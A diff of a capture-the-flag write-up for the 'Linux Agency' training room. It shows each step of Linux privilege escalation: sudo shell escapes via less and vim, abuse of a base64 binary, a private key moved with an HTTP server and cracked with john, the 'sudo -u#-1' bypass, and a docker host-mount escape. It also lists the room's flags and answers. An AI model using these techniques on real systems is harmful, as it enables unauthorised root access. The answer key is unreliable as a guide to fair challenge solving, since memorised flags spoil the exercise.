@@ -2,6 +2,8 @@
 <h1>Linux Agency</h1>
 <p>This Room will help you to sharpen your Linux Skills and help you to learn basic privilege escalation in a HITMAN theme. So, pack your briefcase and grab your SilverBallers as its gonna be a tough ride.</p>
 
+![image](https://github.com/user-attachments/assets/926c7f77-5057-4812-84a5-15e17e040958)
+
 <br>
 
 <h1>Task 1 . Deploy the Machine</h1>
@@ -786,9 +788,298 @@ cat flag.txt
 jordan@linuxagency:~$ 
 ```
 
-![image](https://github.com/user-attachments/assets/545507d5-45f3-4463-80a7-112b18c9fe47)
+<br>
+
+<p>4.6. What is ken's flag?<br>
+<code>ken{4115bf456d1aaf012ed4550c418ba99f}</code></p>
+
+```bash
+jordan@linuxagency:~$ sudo -l
+sudo -l
+Matching Defaults entries for jordan on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jordan may run the following commands on linuxagency:
+    (ken) NOPASSWD: /usr/bin/less
+jordan@linuxagency:~$ 
+jordan@linuxagency:~$ ls | sudo -u ken less
+```
+
+<p>!/bin/bash</p>
+
+```bash
+ken@linuxagency:/home/jordan$
+ken@linuxagency:~$ ls
+examples.desktop  flag.txt
+ken@linuxagency:~$ cat flag.txt
+ken{4115bf456d1aaf012ed4550c418ba99f}
+```
 
 <br>
+
+<p>4.7. What is sean's flag?<br>
+<code>sean{4c5685f4db7966a43cf8e95859801281}</code></p>
+
+```bash
+ken@linuxagency:~$ sudo -l
+Matching Defaults entries for ken on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ken may run the following commands on linuxagency:
+    (sean) NOPASSWD: /usr/bin/vim
+ken@linuxagency:~$ sudo -u sean vim -c ':!/bin/bash'
+
+sean@linuxagency:/home/ken$
+...
+sean@linuxagency:~$ grep -rn 'sean' /var/log 2>/dev/null
+/var/log/syslog.bak:98675:Jan 12 02:58:58 ubuntu kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x6d] high edge lint[0x1]) : sean{4c5685f4db7966a43cf8e95859801281} VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==
+/var/log/auth.log:444:Jun 25 18:12:34 localhost sudo:      ken : TTY=pts/10 ; PWD=/home/ken ; USER=sean ; COMMAND=/usr/bin/vim -c :!/bin/bash
+Binary file /var/log/journal/e5c33f65843d4fde84404ee7ae1a0806/user-1036.journal matches
+Binary file /var/log/journal/e5c33f65843d4fde84404ee7ae1a0806/user-1037.journal matches
+sean@linuxagency:~$ 
+```
+
+<br>
+
+<p>4.8. What is penelope's flag?<br>
+<code>penelope{2da1c2e9d2bd0004556ae9e107c1d222}</code></p>
+
+<p>p3nelope</p>
+
+![image](https://github.com/user-attachments/assets/ceae9855-e256-4278-80cd-4de0aa146a6b)
+
+```bash
+:~# ssh penelope@10.10.167.9
+penelope@10.10.167.9's password: 
+...
+
+penelope@linuxagency:/home$ cd penelope
+penelope@linuxagency:~$ ls
+base64  examples.desktop  flag.txt
+penelope@linuxagency:~$ cat flag.txt
+penelope{2da1c2e9d2bd0004556ae9e107c1d222}
+```
+
+<p>base64</p>
+
+<br>
+
+<p>4.9. What is maya's flag?<br>
+<code>maya{a66e159374b98f64f89f7c8d458ebb2b}</code></p>
+
+```bash
+penelope@linuxagency:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+Password: 
+Sorry, try again.
+Password: 
+Sorry, try again.
+Password: 
+Sorry, user penelope may not run sudo on linuxagency.
+penelope@linuxagency:~$ ls
+base64  examples.desktop  flag.txt
+penelope@linuxagency:~$ pwd
+/home/penelope
+penelope@linuxagency:~$ ./base64 /home/maya/flag.txt
+bWF5YXthNjZlMTU5Mzc0Yjk4ZjY0Zjg5ZjdjOGQ0NThlYmIyYn0K
+penelope@linuxagency:~$ ./base64 /home/maya/flag.txt | base64 -d
+maya{a66e159374b98f64f89f7c8d458ebb2b}
+penelope@linuxagency:/home$ su maya
+Password: 
+maya@linuxagency:/home$ 
+...
+maya@linuxagency:~$ ls -lah
+total 52K
+drwxr-x---  5 maya maya 4.0K Jan 15  2021 .
+drwxr-xr-x 45 root root 4.0K Jan 12  2021 ..
+lrwxrwxrwx  1 maya maya    9 Jan 12  2021 .bash_history -> /dev/null
+-rw-r--r--  1 maya maya  220 Jan 12  2021 .bash_logout
+-rw-r--r--  1 maya maya 3.7K Jan 12  2021 .bashrc
+-rw-r--r--  1 maya maya  519 Jan 12  2021 elusive_targets.txt
+-rw-r--r--  1 maya maya 8.8K Jan 12  2021 examples.desktop
+-r--------  1 maya maya   39 Jan 12  2021 flag.txt
+drwxr-xr-x  3 maya maya 4.0K Jan 12  2021 .local
+drwxr-xr-x  2 maya maya 4.0K Jan 15  2021 old_robert_ssh
+-rw-r--r--  1 maya maya  807 Jan 12  2021 .profile
+drwx------  2 maya maya 4.0K Jan 12  2021 .ssh
+maya@linuxagency:~$ cat elusive_targets.txt
+Welcome 47 glad you made this far.
+You have made our Agency very proud.
+
+But, we have a last unfinished job which is to infiltrate kronstadt industries.
+He has a entrypoint at localhost.
+
+Previously, Another agent tried to infiltrate kronstadt industries nearly 3 years back, But we failed.
+Robert is involved to be illegally hacking into our server's.
+
+He was able to transfer the .ssh folder from robert's home directory.
+
+The old .ssh is kept inside old_robert_ssh directory incase you need it.
+
+Good Luck!!!
+    47
+maya@linuxagency:~$ 
+```bash
+
+<p>old_robert_ssh</p>
+
+```bash
+
+```
+
+<br>
+
+<p>4.10. What is Robert's Passphrase?<br>
+<code>industryweapon</code></p>
+
+```bash
+maya@linuxagency:~$ cd old_robert_ssh
+maya@linuxagency:~/old_robert_ssh$ ls
+id_rsa  id_rsa.pub
+maya@linuxagency:~/old_robert_ssh$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,7903FE7BDBA051C4B0BF7C6C5C597E0B
+
+iRzpH6qjXDvmVU5wwYU7TQfyQHIqYzR0NquznZ3OiXyaSOaovgPXdGP3r50vfIV6
+...
+-----END RSA PRIVATE KEY-----
+maya@linuxagency:~/old_robert_ssh$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.56.125 - - [25/Jun/2025 18:41:49] "GET /id_rsa HTTP/1.1" 200 -
+```
+
+```bash
+:~# wget http://10.10.167.9:8000/id_rsa
+...
+:~# john --wordlist=rockyou.txt id_rsa.hash
+...
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+industryweapon   (id_rsa)
+...
+```
+
+<br>
+
+<p>4.11. What is user.txt?<br>
+<code>user{620fb94d32470e1e9dcf8926481efc96}</code></p>
+
+```bash
+maya@linuxagency:~/old_robert_ssh$ ss -lntu
+Netid State   Recv-Q  Send-Q         Local Address:Port      Peer Address:Port  
+... 
+tcp   LISTEN  0       128                127.0.0.1:2222           0.0.0.0:*     
+...  
+maya@linuxagency:~/old_robert_ssh$ ssh robert@127.0.0.1 -p 2222 -i id_rsa
+robert@127.0.0.1's password: 
+Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
+robert@ec96850005d6:~$ id
+uid=1000(robert) gid=1000(robert) groups=1000(robert)
+robert@ec96850005d6:~$ sudo -l
+Matching Defaults entries for robert on ec96850005d6:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User robert may run the following commands on ec96850005d6:
+    (ALL, !root) NOPASSWD: /bin/bash
+robert@ec96850005d6:~$ ls
+robert.txt
+robert@ec96850005d6:~$ cat robert.txt
+You shall not pass from here!!!
+
+I will not allow ICA to take over my world.
+```
+
+<p>linpeas.sh</p>
+
+```bash
+robert@ec96850005d6:~$ sudo -u#-1 /bin/bash
+root@ec96850005d6:~# cd /root
+root@ec96850005d6:/root# ls
+success.txt  user.txt
+root@ec96850005d6:/root# cat user.txt
+user{620fb94d32470e1e9dcf8926481efc96}
+root@ec96850005d6:/root# cat success.txt
+47 you made it!!!
+
+You have made it, Robert has been taught a lesson not to mess with ICA.
+Now, Return to our Agency back with some safe route.
+All the previous door's have been closed.
+
+Good Luck Amigo!
+```
+
+<p>linpeas.sh</p>
+
+<p>4.11. What is root.txt?<br>
+<code>root{62ca2110ce7df377872dd9f0797f8476}</code></p>
+
+```bash
+root@ec96850005d6:/root# cat /proc/1/cgroup
+12:hugetlb:/docker/ec96850005d6cf609fadbeaef4a7dbdcad5108f5c319c2f69bc9badf9bc2fbdb
+11:rdma:/
+10:cpu,cpuacct:/docker/ec96850005d6cf609fadbeaef4a7dbdcad5108f5c319c2f69bc9badf9bc2fbdb
+9:pids:/docker/ec96850005d6cf609fadbeaef4a7dbdcad5108f5c319c2f69bc9badf9bc2fbdb
+8:freezer:/docker/ec96850005d6cf609fadbeaef4a7dbdcad5108f5c319c2f69bc9badf9bc2fbdb
+7:blkio:/docker/ec96850005d6cf609fadbeaef4a7dbdcad5108f5c319c2f69bc9badf9bc2fbdb
+6:cpuset:/docker/ec96850005d6cf609fadbeaef4a7dbdcad5108f5c319c2f69bc9badf9bc2fbdb
+5:memory:/docker/ec96850005d6cf609fadbeaef4a7dbdcad5108f5c319c2f69bc9badf9bc2fbdb
+4:perf_event:/docker/ec96850005d6cf609fadbeaef4a7dbdcad5108f5c319c2f69bc9badf9bc2fbdb
+3:devices:/docker/ec96850005d6cf609fadbeaef4a7dbdcad5108f5c319c2f69bc9badf9bc2fbdb
+2:net_cls,net_prio:/docker/ec96850005d6cf609fadbeaef4a7dbdcad5108f5c319c2f69bc9badf9bc2fbdb
+1:name=systemd:/docker/ec96850005d6cf609fadbeaef4a7dbdcad5108f5c319c2f69bc9badf9bc2fbdb
+0::/system.slice/containerd.service
+root@ec96850005d6:/root# find / -name '*docker*' 2>/dev/null
+/run/docker.pid
+/run/docker
+/run/docker.sock
+/run/systemd/units/invocation:docker.service
+/tmp/docker
+/usr/share/vim/vim80/ftplugin/dockerfile.vim
+/usr/share/vim/vim80/syntax/dockerfile.vim
+...
+root@ec96850005d6:/root# /tmp/docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+mangoman            latest              b5f279024ce0        4 years ago         213MB
+
+
+
+root@ec96850005d6:/root# /tmp/docker run -it -v /:/host/ mangoman chroot /host/ bash
+root@c27220491002:/# ls
+bin    etc         initrd.img.old  media  root  srv       usr
+boot   flag.txt    lib             mnt    run   swapfile  var
+cdrom  home        lib64           opt    sbin  sys       vmlinuz
+dev    initrd.img  lost+found      proc   snap  tmp
+root@c27220491002:/# cd /root
+root@c27220491002:~# ls
+message.txt  root.txt
+root@c27220491002:~# cat root.txt
+root{62ca2110ce7df377872dd9f0797f8476}
+root@c27220491002:~# 
+```
+
+<br>
+<br>
+
+
+![image](https://github.com/user-attachments/assets/c06bac1e-a00a-41af-a4a7-a37d74b9b387)
+
+![image](https://github.com/user-attachments/assets/2e3bcba6-8c72-493b-9ac7-3da77a0c918c)
+
 <br>
 
 <div align="center">
@@ -796,67 +1087,24 @@ jordan@linuxagency:~$
 | Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
 | :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
 |                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
-| June 25, 2025     | 415      |     184ᵗʰ    |      5ᵗʰ     |     275ᵗʰ   |     6ᵗʰ    |  110,197 |    801    |     63    |
+| June 25, 2025     | 414      |     184ᵗʰ    |      5ᵗʰ     |     276ᵗʰ   |     6ᵗʰ    |  110,261 |    802    |     63    |
 
-</div>
+</div
 
-![image](https://github.com/user-attachments/assets/d17c699d-0e0a-4eff-98cb-154f6d271b30)
+ ![image](https://github.com/user-attachments/assets/6e779c41-0a87-4c5f-b79e-51831128d78f)
 
-![image](https://github.com/user-attachments/assets/7246eba2-96a6-4a96-a54b-21538a28cd0c)
 
-![image](https://github.com/user-attachments/assets/b8a51f45-d154-4059-96f7-d0b64e03ce37)
+![image](https://github.com/user-attachments/assets/1459acf0-150a-4bba-8e87-8a7b379ff4c4)
 
-![image](https://github.com/user-attachments/assets/c20baf8d-f161-4beb-ba64-f2d3921ec418)
 
-![image](https://github.com/user-attachments/assets/9d362ed8-fd2a-47cc-bb49-06cf0b510aca)
+![image](https://github.com/user-attachments/assets/c92502ac-82b5-4105-b737-c2dc23c9523d)
 
-![image](https://github.com/user-attachments/assets/2eebd4f7-6e56-460e-bba8-ff16519d5e2c)
+![image](https://github.com/user-attachments/assets/c53631c6-9a2d-41f5-bfa1-a784d955c3a0)
 
-<br>
-<br>
 
-<p>4.6. What is ken's flag?<br>
-<code>______</code></p>
+![image](https://github.com/user-attachments/assets/415f3eba-1e75-45be-9e67-5a90ff5490d9)
 
-```bash
 
-```
 
-<p>4.7. What is sean's flag?<br>
-<code>______</code></p>
 
-```bash
-
-```
-
-<p>4.8. What is penelope's flag?<br>
-<code>______</code></p>
-
-```bash
-
-```
-
-<p>4.9. What is robert's Passphrase?<br>
-<code>______</code></p>
-
-```bash
-
-```
-
-<p>4.10. What is user.txt?<br>
-<code>______</code></p>
-
-```bash
-
-```
-
-<p>4.11. What is root.txt?<br>
-<code>______</code></p>
-
-```bash
-
-```
-
-<br>
-<br>
 
